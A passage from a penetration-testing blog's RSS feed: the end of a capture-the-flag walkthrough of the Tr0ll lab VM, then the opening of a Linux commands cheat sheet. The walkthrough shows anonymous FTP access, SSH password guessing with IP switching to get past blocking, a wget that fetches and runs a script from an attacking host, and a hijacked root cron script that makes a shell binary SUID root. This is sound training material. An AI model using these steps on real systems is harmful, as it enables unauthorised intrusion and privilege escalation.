&lt;p&gt;###FTP Enumeration&lt;/p&gt;

&lt;p&gt;Nmap discovered anonymous FTP was exposed on the target, I downloaded lol.pcap from ftp root:&lt;/p&gt;

&lt;section class=&quot;shellbox&quot;&gt;
    &lt;div class=&quot;unit golden-large code&quot;&gt;
      &lt;p class=&quot;title&quot;&gt;ftp lol.pcap from target&lt;/p&gt;
      &lt;div class=&quot;shell&quot;&gt;
        &lt;p class=&quot;line&quot;&gt;
          &lt;span class=&quot;prompt&quot;&gt;root&lt;/span&gt;&lt;span&gt;:&lt;/span&gt;&lt;span class=&quot;path&quot;&gt;~&lt;/span&gt;&lt;span&gt;#&lt;/span&gt;
          &lt;span class=&quot;command&quot;&gt;ftp 192.168.78.140&lt;/span&gt;&lt;/p&gt;
          &lt;span class=&quot;output&quot;&gt;&lt;br /&gt;&lt;/span&gt;
          &lt;span class=&quot;output&quot;&gt;Connected to 192.168.78.140&lt;br /&gt;&lt;/span&gt;
          &lt;span class=&quot;output&quot;&gt;220 (vsFTPd 3.0.2)&lt;br /&gt;&lt;/span&gt;
          &lt;span class=&quot;output&quot;&gt;Name (192.168.78.140:root): anonymous&lt;br /&gt;&lt;/span&gt;
          &lt;span class=&quot;output&quot;&gt;331 Please specify the password.&lt;br /&gt;&lt;/span&gt;
          &lt;span class=&quot;output&quot;&gt;Password:&lt;br /&gt;&lt;/span&gt; 
          &lt;span class=&quot;output&quot;&gt;230 Login successful.&lt;br /&gt;&lt;/span&gt;
          &lt;span class=&quot;output&quot;&gt;Remote system type is UNIX.&lt;br /&gt;&lt;/span&gt;
          &lt;span class=&quot;output&quot;&gt;Using binary mode to transfer files.&lt;br /&gt;&lt;/span&gt;
          &lt;span class=&quot;output&quot;&gt;ftp&amp;gt; get lol.pcap&lt;br /&gt;&lt;/span&gt;
          &lt;span class=&quot;output&quot;&gt;local: lol.pcap remote: lol.pcap&lt;br /&gt;&lt;/span&gt;
          &lt;span class=&quot;output&quot;&gt;200 PORT command successful. Consider using PASV.&lt;br /&gt;&lt;/span&gt;
          &lt;span class=&quot;output&quot;&gt;150 Opening BINARY mode data connection for lol.pcap (8068 bytes).&lt;br /&gt;&lt;/span&gt;
          &lt;span class=&quot;output&quot;&gt;226 Transfer complete.&lt;br /&gt;&lt;/span&gt;
          &lt;span class=&quot;output&quot;&gt;80/tcp open  http    Apache httpd 2.4.7 ((Ubuntu))&lt;br /&gt;&lt;/span&gt;
          &lt;span class=&quot;output&quot;&gt;8068 bytes received in 0.00 secs (1614.9 kB/s)&lt;br /&gt;&lt;/span&gt;
          &lt;span class=&quot;output&quot;&gt;ftp&amp;gt; exit&lt;br /&gt;&lt;/span&gt;
          &lt;span class=&quot;output&quot;&gt;221 Goodbye.&lt;br /&gt;&lt;/span&gt;
        &amp;lt;/p&amp;gt;
      &lt;/div&gt;
    &lt;/div&gt;
&lt;/section&gt;

&lt;p&gt;Examined the contents of lol.pcap in Wireshark, discovering the following message:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/img/blog/tr0ll-lol.pcap.png&quot; alt=&quot;tr0ll lol.pcap&quot; /&gt;&lt;/p&gt;

&lt;p&gt;For clarity the message read:&lt;/p&gt;

&lt;p&gt;&lt;i&gt;FTP Data (Well, well, well, aren’t you just a clever little devil, you almost found the sup3rs3cr3tdirlol :-P Sucks, you were so close… gotta TRY HARDER!&lt;/i&gt;&lt;/p&gt;

&lt;p&gt;Checking for exposed serives in the previous Nmap scan we can see FTP, SSH and HTTP are exposed.&lt;/p&gt;

&lt;p&gt;A quick attempt at logging in over SSH with root with the password “sup3rs3cr3tdirlol”  - resulted in a fail (as expected).&lt;/p&gt;

&lt;p&gt;Onto the next service in the list.&lt;/p&gt;

&lt;p&gt;###HTTP Enumeration&lt;/p&gt;

&lt;section class=&quot;shellbox&quot;&gt;
    &lt;div class=&quot;unit golden-large code&quot;&gt;
      &lt;p class=&quot;title&quot;&gt;nmap --script=http-enum -p80 -n 192.168.78.140&lt;/p&gt;
      &lt;div class=&quot;shell&quot;&gt;
        &lt;p class=&quot;line&quot;&gt;
          &lt;span class=&quot;prompt&quot;&gt;root&lt;/span&gt;&lt;span&gt;:&lt;/span&gt;&lt;span class=&quot;path&quot;&gt;~&lt;/span&gt;&lt;span&gt;#&lt;/span&gt;
          &lt;span class=&quot;command&quot;&gt;nmap --script=http-enum -p80 -n 192.168.78.140&lt;/span&gt;&lt;/p&gt;
          &lt;span class=&quot;output&quot;&gt;&lt;br /&gt;&lt;/span&gt;
          &lt;span class=&quot;output&quot;&gt;Starting Nmap 6.47 ( http://nmap.org ) at 2014-12-24 18:40 GMT&lt;br /&gt;&lt;/span&gt;
          &lt;span class=&quot;output&quot;&gt;Nmap scan report for 192.168.78.140&lt;br /&gt;&lt;/span&gt;
          &lt;span class=&quot;output&quot;&gt;Host is up (0.00046s latency).&lt;br /&gt;&lt;/span&gt;
          &lt;span class=&quot;output&quot;&gt;PORT   STATE SERVICE&lt;br /&gt;&lt;/span&gt;
          &lt;span class=&quot;output&quot;&gt;80/tcp open  http&lt;br /&gt;&lt;/span&gt; 
          &lt;span class=&quot;output&quot;&gt;| http-enum:&lt;br /&gt;&lt;/span&gt;
          &lt;span class=&quot;output&quot;&gt;|   /robots.txt: Robots file&lt;br /&gt;&lt;/span&gt;
          &lt;span class=&quot;output&quot;&gt;|_  /secret/: Potentially interesting folder&lt;br /&gt;&lt;/span&gt;
          &lt;span class=&quot;output&quot;&gt;MAC Address: 00:0C:29:D9:C1:FE (VMware)&lt;br /&gt;&lt;/span&gt;
          &lt;span class=&quot;output&quot;&gt;&lt;br /&gt;&lt;/span&gt;
          &lt;span class=&quot;output&quot;&gt;Nmap done: 1 IP address (1 host up) scanned in 0.84 seconds&lt;br /&gt;&lt;/span&gt;
        &amp;lt;/p&amp;gt;
      &lt;/div&gt;
    &lt;/div&gt;
&lt;/section&gt;

&lt;p&gt;Entering /secret/ url in the browser rendered:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/img/blog/u-mad-bro-tr0ll.png&quot; alt=&quot;tr0ll U MAD BRO&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Nothing exciting was in the page source…&lt;/p&gt;

&lt;p&gt;I took a guess and entered sup3rs3cr3tdirlol as a dir:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/img/blog/sup3rs3cr3tdirlol.png&quot; alt=&quot;tr0ll sup3rs3cr3tdirlol&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Lucked in! But it didn’t contain this:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/img/kirk-rofl.gif&quot; alt=&quot;tr0ll Pass.txt&quot; /&gt;&lt;/p&gt;

&lt;p&gt;strings output for “roflmao”:&lt;/p&gt;

&lt;section class=&quot;shellbox&quot;&gt;
    &lt;div class=&quot;unit golden-large code&quot;&gt;
      &lt;p class=&quot;title&quot;&gt;strings ~/Downloads/roflmao&lt;/p&gt;
      &lt;div class=&quot;shell&quot;&gt;
        &lt;p class=&quot;line&quot;&gt;
          &lt;span class=&quot;prompt&quot;&gt;root&lt;/span&gt;&lt;span&gt;:&lt;/span&gt;&lt;span class=&quot;path&quot;&gt;~&lt;/span&gt;&lt;span&gt;#&lt;/span&gt;
          &lt;span class=&quot;command&quot;&gt;strings ~/Downloads/roflmao&lt;/span&gt;&lt;/p&gt;
          &lt;span class=&quot;output&quot;&gt;&lt;br /&gt;&lt;/span&gt;
          &lt;span class=&quot;output&quot;&gt;lib/ld-linux.so.2&lt;br /&gt;&lt;/span&gt;
          &lt;span class=&quot;output&quot;&gt;libc.so.6&lt;br /&gt;&lt;/span&gt;
          &lt;span class=&quot;output&quot;&gt;_IO_stdin_used&lt;br /&gt;&lt;/span&gt;
          &lt;span class=&quot;output&quot;&gt;printf&lt;br /&gt;&lt;/span&gt;
          &lt;span class=&quot;output&quot;&gt;__libc_start_main&lt;br /&gt;&lt;/span&gt; 
          &lt;span class=&quot;output&quot;&gt;__gmon_start__&lt;br /&gt;&lt;/span&gt;
          &lt;span class=&quot;output&quot;&gt;GLIBC_2.0&lt;br /&gt;&lt;/span&gt;
          &lt;span class=&quot;output&quot;&gt;PTRh&lt;br /&gt;&lt;/span&gt;
          &lt;span class=&quot;output&quot;&gt;[^_]&lt;br /&gt;&lt;/span&gt;
          &lt;span class=&quot;output&quot;&gt;Find address 0x0856BF to proceed&lt;br /&gt;&lt;/span&gt;
          &lt;span class=&quot;output&quot;&gt;;*2$&quot;&lt;br /&gt;&lt;/span&gt;
        &amp;lt;/p&amp;gt;
      &lt;/div&gt;
    &lt;/div&gt;
&lt;/section&gt;

&lt;p&gt;The binary appeared to just print “0x0856BF”, I entered this in the browser again - not expecting it to work.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/img/blog/which_one_lol.txt.png&quot; alt=&quot;tr0ll which on lol&quot; /&gt;&lt;/p&gt;

&lt;p&gt;I lucked in again!&lt;/p&gt;

&lt;p&gt;Another dir contained:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/img/blog/pass.txt.png&quot; alt=&quot;tr0ll Pass.txt&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Containing:&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;Good_job_:&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;##SSH Brute Force&lt;/p&gt;

&lt;p&gt;I manually attempted a SSH brute force using the previously discovered usernames + password from Pass.txt. After several attempts the connection was refused via SSH, rebooting the target VM did not help - I suspected iptables, fail2ban / DenyHosts.&lt;/p&gt;

&lt;p&gt;Changing the attacking machines IP address allowed me to reconnect, none of the usernames authenticated with the password in Pass.txt.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/img/picard-puff.gif&quot; alt=&quot;Picard Puff&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Not sure what to do next, I tried the file name as the password against the previous list (annoyingly I had to change the target machines IP address again to complete).&lt;/p&gt;

&lt;h3 id=&quot;remote-exploit&quot;&gt;Remote Exploit&lt;/h3&gt;

&lt;p&gt;Success, I managed to authenticate using:&lt;/p&gt;

&lt;div class=&quot;mobile-side-scroller&quot; style=&quot;width:50%;&quot;&gt;
&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;Username&lt;/th&gt;
      &lt;th&gt;Password&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
      &lt;tbody&gt;
        &lt;tr&gt;
           &lt;td&gt;
               &lt;pc&gt;&lt;p&gt;&lt;code&gt;overflow&lt;/code&gt;&lt;/p&gt;&lt;/pc&gt;
           &lt;/td&gt;
           &lt;td&gt;
               &lt;pc&gt;&lt;p&gt;Pass.txt&lt;/p&gt;&lt;/pc&gt;
           &lt;/td&gt;
        &lt;/tr&gt;
      &lt;/tbody&gt;
&lt;/table&gt;
&lt;/div&gt;

&lt;section class=&quot;shellbox&quot;&gt;
    &lt;div class=&quot;unit golden-large code&quot;&gt;
      &lt;p class=&quot;title&quot;&gt;ssh overflow@192.168.78.140&lt;/p&gt;
      &lt;div class=&quot;shell&quot;&gt;
        &lt;p class=&quot;line&quot;&gt;
          &lt;span class=&quot;prompt&quot;&gt;root&lt;/span&gt;&lt;span&gt;:&lt;/span&gt;&lt;span class=&quot;path&quot;&gt;~&lt;/span&gt;&lt;span&gt;#&lt;/span&gt;
          &lt;span class=&quot;command&quot;&gt;ssh overflow@192.168.78.140&lt;/span&gt;&lt;/p&gt;
          &lt;span class=&quot;output&quot;&gt;&lt;br /&gt;&lt;/span&gt;
          &lt;span class=&quot;output&quot;&gt;Welcome to Ubuntu 14.04.1 LTS (GNU/Linux 3.13.0-32-generic i686)&lt;br /&gt;&lt;/span&gt;
          &lt;span class=&quot;output&quot;&gt;&lt;br /&gt;&lt;/span&gt;
		  &lt;span class=&quot;output&quot;&gt;* Documentation:  https://help.ubuntu.com/&lt;br /&gt;&lt;/span&gt;
		  &lt;span class=&quot;output&quot;&gt;&lt;br /&gt;&lt;/span&gt;
          &lt;span class=&quot;output&quot;&gt;The programs included with the Ubuntu system are free software; the exact distribution terms for each program are described in the individual files in /usr/share/doc/*/copyright.&lt;br /&gt;&lt;/span&gt;
		  &lt;span class=&quot;output&quot;&gt;&lt;br /&gt;&lt;/span&gt;
          &lt;span class=&quot;output&quot;&gt;Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by applicable law.&lt;br /&gt;&lt;/span&gt;
		  &lt;span class=&quot;output&quot;&gt;&lt;br /&gt;&lt;/span&gt;
          &lt;span class=&quot;output&quot;&gt;The programs included with the Ubuntu system are free software; the exact distribution terms for each program are described in the individual files in /usr/share/doc/*/copyright.&lt;br /&gt;&lt;/span&gt;
          &lt;span class=&quot;output&quot;&gt;Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by applicable law.&lt;br /&gt;&lt;/span&gt;
          &lt;span class=&quot;output&quot;&gt;&lt;br /&gt;&lt;/span&gt;
          &lt;span class=&quot;output&quot;&gt;Last login: Wed Dec 24 12:00:52 2014 from 192.168.78.128&lt;br /&gt;&lt;/span&gt;
		  &lt;span class=&quot;output&quot;&gt;Could not chdir to home directory /home/overflow: No such file or directory&lt;br /&gt;&lt;/span&gt;
		  &lt;span class=&quot;output&quot;&gt;&lt;br /&gt;&lt;/span&gt;
		  &lt;span class=&quot;output&quot;&gt;$ id&lt;br /&gt;&lt;/span&gt;
	      &lt;span class=&quot;output&quot;&gt;uid=1002(overflow) gid=1002(overflow) groups=1002(overflow)&lt;br /&gt;&lt;/span&gt;

        &amp;lt;/p&amp;gt;
      &lt;/div&gt;
    &lt;/div&gt;
&lt;/section&gt;

&lt;p&gt;Then almost as soon as I’d logged in, the following message printed to console and the session closed:&lt;/p&gt;

&lt;section class=&quot;shellbox&quot;&gt;
    &lt;div class=&quot;unit golden-large code&quot;&gt;
      &lt;p class=&quot;title&quot;&gt;Broadcast Message from root@trol&lt;/p&gt;
      &lt;div class=&quot;shell&quot;&gt;
        &lt;p class=&quot;line&quot;&gt;
		  &lt;span class=&quot;output&quot;&gt;&lt;br /&gt;&lt;/span&gt;
          &lt;span class=&quot;output&quot;&gt;Broadcast Message from root@trol&lt;br /&gt;&lt;/span&gt;
          &lt;span class=&quot;output&quot;&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;(somewhere) at 22:00 ... &lt;br /&gt;&lt;/span&gt;
		  &lt;span class=&quot;output&quot;&gt;&lt;br /&gt;&lt;/span&gt;
		&lt;/p&gt;
		&lt;p class=&quot;line&quot;&gt;
		  &lt;span class=&quot;output&quot;&gt;TIMES UP LOL!&lt;br /&gt;&lt;/span&gt;
        &lt;/p&gt;
      &lt;/div&gt;
    &lt;/div&gt;
&lt;/section&gt;

&lt;p&gt;This became rather annoying…&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/img/janeway-annoyed.gif&quot; alt=&quot;Janeway Annoyed&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;local-enumeration&quot;&gt;Local Enumeration&lt;/h2&gt;

&lt;p&gt;I copied over my local enumeration sctipt to /var/tmp/ which discovered the following world writable files:&lt;/p&gt;

&lt;section class=&quot;shellbox&quot;&gt;
    &lt;div class=&quot;unit golden-large code&quot;&gt;
      &lt;p class=&quot;title&quot;&gt;Local Enumeration Sctipt&lt;/p&gt;
      &lt;div class=&quot;shell&quot;&gt;
        &lt;p class=&quot;line&quot;&gt;
          &lt;span class=&quot;prompt&quot;&gt;root&lt;/span&gt;&lt;span&gt;:&lt;/span&gt;&lt;span class=&quot;path&quot;&gt;~&lt;/span&gt;&lt;span&gt;#&lt;/span&gt;
          &lt;span class=&quot;command&quot;&gt;wget http://attacking-machine/exploits/enumeration/lin/linux-local-enum.sh -P /var/tmp/ &amp;amp;&amp;amp; chmod 700 /var/tmp/linux-local-enum.sh &amp;amp;&amp;amp; ./var/tmp/linux-local-enum.sh&lt;br /&gt;&lt;/span&gt;
        &lt;/p&gt;
      &lt;/div&gt;
    &lt;/div&gt;
&lt;/section&gt;

&lt;h3 id=&quot;weak-filesystem-permissions&quot;&gt;Weak Filesystem Permissions&lt;/h3&gt;

&lt;p&gt;The enumeration script identified the following world writable files:&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;c&quot;&gt;#########################################&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;## 777 Files                           ##&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;#########################################&lt;/span&gt;

/srv/ftp/lol.pcap
/var/tmp/cleaner.py.swp
/var/www/html/sup3rs3cr3tdirlol/roflmao
/var/log/cronlog
/lib/log/cleaner.py&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;h3 id=&quot;enumeration-findings&quot;&gt;Enumeration Findings&lt;/h3&gt;

&lt;p&gt;/lib/log/cleaner.py was owned by root and executed by cron to clean out /tmp&lt;/p&gt;

&lt;h2 id=&quot;local-privilege-escalation&quot;&gt;Local Privilege Escalation&lt;/h2&gt;

&lt;p&gt;From the attacking machine I downloaded an suid bin (spawns a shell) to /usr/bin/suid on the target.&lt;/p&gt;

&lt;p&gt;Exploiting the poor filesystem permissions, I swapped out the contents of /lib/log/cleaner.py for:&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt;&lt;span class=&quot;c1&quot;&gt;#!/usr/bin/env python
&lt;/span&gt;&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;os&lt;/span&gt;
&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;sys&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;try&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;os&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;system&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'chown root:root /var/tmp/suid; chmod 4777 /var/tmp/suid'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;except&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;sys&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;exit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;h3 id=&quot;got-root&quot;&gt;Got Root&lt;/h3&gt;

&lt;p&gt;Went to get a coffee, came back and reconnected after the annoying message.&lt;/p&gt;

&lt;p&gt;Executed my suid binary, got root.&lt;/p&gt;

&lt;section class=&quot;shellbox&quot;&gt;
    &lt;div class=&quot;unit golden-large code&quot;&gt;
      &lt;p class=&quot;title&quot;&gt;Local Privilege Escalation&lt;/p&gt;
      &lt;div class=&quot;shell&quot;&gt;
        &lt;p class=&quot;line&quot;&gt;
          &lt;span class=&quot;prompt&quot;&gt;root&lt;/span&gt;&lt;span&gt;:&lt;/span&gt;&lt;span class=&quot;path&quot;&gt;~&lt;/span&gt;&lt;span&gt;#&lt;/span&gt;
          &lt;span class=&quot;command&quot;&gt;/var/tmp/suid&lt;br /&gt;&lt;/span&gt;
        &lt;/p&gt;
        &lt;p class=&quot;line&quot;&gt;
          &lt;span class=&quot;prompt&quot;&gt;root&lt;/span&gt;&lt;span&gt;:&lt;/span&gt;&lt;span class=&quot;path&quot;&gt;~&lt;/span&gt;&lt;span&gt;#&lt;/span&gt;
          &lt;span class=&quot;command&quot;&gt;cat /root/proof.txt&lt;br /&gt;&lt;/span&gt;
          &lt;br /&gt;
          &lt;span class=&quot;output&quot;&gt;Good job, you did it!&lt;br /&gt;&lt;/span&gt;
          &lt;br /&gt;
          &lt;span class=&quot;output&quot;&gt;702a8c18d29c6f3ca0d99ef5712bfbdc&lt;br /&gt;&lt;/span&gt;
        &lt;/p&gt;
        &lt;br /&gt;
        &lt;p class=&quot;line&quot;&gt;
          &lt;span class=&quot;prompt&quot;&gt;root&lt;/span&gt;&lt;span&gt;:&lt;/span&gt;&lt;span class=&quot;path&quot;&gt;~&lt;/span&gt;&lt;span&gt;#&lt;/span&gt;
          &lt;span class=&quot;command&quot;&gt;id&lt;br /&gt;&lt;/span&gt;
          &lt;br /&gt;
          &lt;span class=&quot;output&quot;&gt;uid=0(root) gid=0(root) groups=0(root),1002(overflow)&lt;br /&gt;&lt;/span&gt;
        &lt;/p&gt;
        &lt;p class=&quot;line&quot;&gt;
          &lt;span class=&quot;prompt&quot;&gt;root&lt;/span&gt;&lt;span&gt;:&lt;/span&gt;&lt;span class=&quot;path&quot;&gt;~&lt;/span&gt;&lt;span&gt;#&lt;/span&gt;     
          &lt;span class=&quot;command&quot;&gt;whoami&lt;br /&gt;&lt;/span&gt;
          &lt;br /&gt;
          &lt;span class=&quot;output&quot;&gt;root&lt;br /&gt;&lt;/span&gt;
        &lt;/p&gt;
      &lt;/div&gt;
    &lt;/div&gt;
&lt;/section&gt;

&lt;p&gt;####Root dance…&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/img/picard-shake-it-so.gif&quot; alt=&quot;Picard Dancing&quot; /&gt;&lt;/p&gt;

&lt;p&gt;##Thanks&lt;/p&gt;

&lt;p&gt;Thanks to &lt;a href=&quot;https://twitter.com/@maleus21&quot;&gt;@maleus21&lt;/a&gt; for creating this VM challenege.&lt;/p&gt;
</description>
        </item>
        
      
    
      
        
        <item>
          <title>Linux Commands Cheat Sheet</title>
          <link>https://highon.coffee/blog/linux-commands-cheat-sheet/</link>
          <pubDate>Sun, 02 Nov 2014 08:20:10 +0000</pubDate>
          <dc:creator>Arr0way</dc:creator>
          
          <category>Penetration Testing</category>
          
          <category>linux-enum</category>
          
          <category>Enumeration</category>
          
          <category>linux-commands</category>
          
          
          <category>cheat-sheet</category>
          
          <guid isPermaLink="true">https://highon.coffee/blog/linux-commands-cheat-sheet/</guid>
          <description>&lt;ul id=&quot;markdown-toc&quot;&gt;
  &lt;li&gt;&lt;a href=&quot;#linux-penetration-testing-commands&quot; id=&quot;markdown-toc-linux-penetration-testing-commands&quot;&gt;Linux Penetration Testing Commands&lt;/a&gt;    &lt;ul&gt;
      &lt;li&gt;&lt;a href=&quot;#linux-network-commands&quot; id=&quot;markdown-toc-linux-network-commands&quot;&gt;Linux Network Commands&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#system-information-commands&quot; id=&quot;markdown-toc-system-information-commands&quot;&gt;System Information Commands&lt;/a&gt;        &lt;ul&gt;
          &lt;li&gt;&lt;a href=&quot;#redhat--centos--rpm-based-distros&quot; id=&quot;markdown-toc-redhat--centos--rpm-based-distros&quot;&gt;Redhat / CentOS / RPM Based Distros&lt;/a&gt;&lt;/li&gt;
          &lt;li&gt;&lt;a href=&quot;#yum-commands&quot; id=&quot;markdown-toc-yum-commands&quot;&gt;YUM Commands&lt;/a&gt;&lt;/li&gt;
          &lt;li&gt;&lt;a href=&quot;#debian--ubuntu--deb-based-distros&quot; id=&quot;markdown-toc-debian--ubuntu--deb-based-distros&quot;&gt;Debian / Ubuntu / .deb Based Distros&lt;/a&gt;&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#linux-user-management&quot; id=&quot;markdown-toc-linux-user-management&quot;&gt;Linux User Management&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#linux-decompression-commands&quot; id=&quot;markdown-toc-linux-decompression-commands&quot;&gt;Linux Decompression Commands&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#linux-compression-commands&quot; id=&quot;markdown-toc-linux-compression-commands&quot;&gt;Linux Compression Commands&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#linux-file-commands&quot; id=&quot;markdown-toc-linux-file-commands&quot;&gt;Linux File Commands&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#samba-commands&quot; id=&quot;markdown-toc-samba-commands&quot;&gt;Samba Commands&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#breaking-out-of-limited-shells&quot; id=&quot;markdown-toc-breaking-out-of-limited-shells&quot;&gt;Breaking Out of Limited Shells&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#misc-commands&quot; id=&quot;markdown-toc-misc-commands&quot;&gt;Misc Commands&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#linux-file-system-permissions&quot; id=&quot;markdown-toc-linux-file-system-permissions&quot;&gt;Linux File System Permissions&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#linux-file-system&quot; id=&quot;markdown-toc-linux-file-system&quot;&gt;Linux File System&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#linux-interesting-files--dirs&quot; id=&quot;markdown-toc-linux-interesting-files--dirs&quot;&gt;Linux Interesting Files / Dir’s&lt;/a&gt;&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;A collection of hopefully useful Linux Commands for pen testers, this is not a complete list but a collection of commonly used commands + syntax as a sort of “cheatsheet”, this content will be constantly updated as I discover new awesomeness.&lt;/p&gt;

&lt;h2 id=&quot;linux-penetration-testing-commands&quot;&gt;Linux Penetration Testing Commands&lt;/h2&gt;

&lt;p&gt;The commands listed below are designed for local enumeration, typical commands a penetration tester would use during post exploitation or when performing command injection etc. See our pen test cheat sheet for an in depth list of &lt;a href=&quot;/blog/penetration-testing-tools-cheat-sheet/&quot;&gt;pen testing tool commands&lt;/a&gt; and example usage.&lt;/p&gt;

&lt;h3 id=&quot;linux-network-commands&quot;&gt;Linux Network Commands&lt;/h3&gt;

&lt;div class=&quot;mobile-side-scroller&quot;&gt;
&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;Command&lt;/th&gt;
      &lt;th&gt;Description&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;
        &lt;p&gt;&lt;code&gt;netstat -tulpn&lt;/code&gt;&lt;/p&gt;
      &lt;/td&gt;
      &lt;td&gt;
        &lt;p&gt;

          Show Linux network ports with process ID's (PIDs)

        &lt;/p&gt;
      &lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;
        &lt;p&gt;&lt;code&gt;watch ss -stplu&lt;/code&gt;&lt;/p&gt;
      &lt;/td&gt;
      &lt;td&gt;
        &lt;p&gt;

          Watch TCP, UDP open ports in real time with socket summary.

        &lt;/p&gt;
      &lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;
        &lt;p&gt;&lt;code&gt;lsof -i&lt;/code&gt;&lt;/p&gt;
      &lt;/td&gt;
      &lt;td&gt;
        &lt;p&gt;

          Show established connections.

        &lt;/p&gt;
      &lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;
        &lt;p&gt;&lt;code&gt;macchanger -m MACADDR INTR&lt;/code&gt;&lt;/p&gt;
      &lt;/td&gt;
      &lt;td&gt;
        &lt;p&gt;
        Change MAC address on KALI Linux.

        &lt;/p&gt;
      &lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;
        &lt;p&gt;&lt;code&gt;ifconfig eth0 192.168.2.1/24&lt;/code&gt;&lt;/p&gt;
      &lt;/td&gt;
      &lt;td&gt;
        &lt;p&gt;

          Set IP address in Linux.
        &lt;/p&gt;
      &lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;
        &lt;p&gt;&lt;code&gt;ifconfig eth0:1 192.168.2.3/24&lt;/code&gt;&lt;/p&gt;
      &lt;/td&gt;
      &lt;td&gt;
        &lt;p&gt;

          Add IP address to existing network interface in Linux.

        &lt;/p&gt;
      &lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;
        &lt;p&gt;&lt;code&gt;ifconfig eth0 hw ether MACADDR&lt;/code&gt;&lt;/p&gt;
      &lt;/td&gt;
      &lt;td&gt;
        &lt;p&gt;

          Change MAC address in Linux using ifconfig.  

        &lt;/p&gt;
      &lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;
        &lt;p&gt;&lt;code&gt;ifconfig eth0 mtu 1500&lt;/code&gt;&lt;/p&gt;
      &lt;/td&gt;
      &lt;td&gt;
        &lt;p&gt;

          Change MTU size Linux using ifconfig, change 1500 to your desired MTU.

        &lt;/p&gt;
      &lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;
        &lt;p&gt;&lt;code&gt;dig -x 192.168.1.1 &lt;/code&gt;&lt;/p&gt;
      &lt;/td&gt;
      &lt;td&gt;
        &lt;p&gt;

          Dig reverse lookup on an IP address.

        &lt;/p&gt;
      &lt;/td&gt;
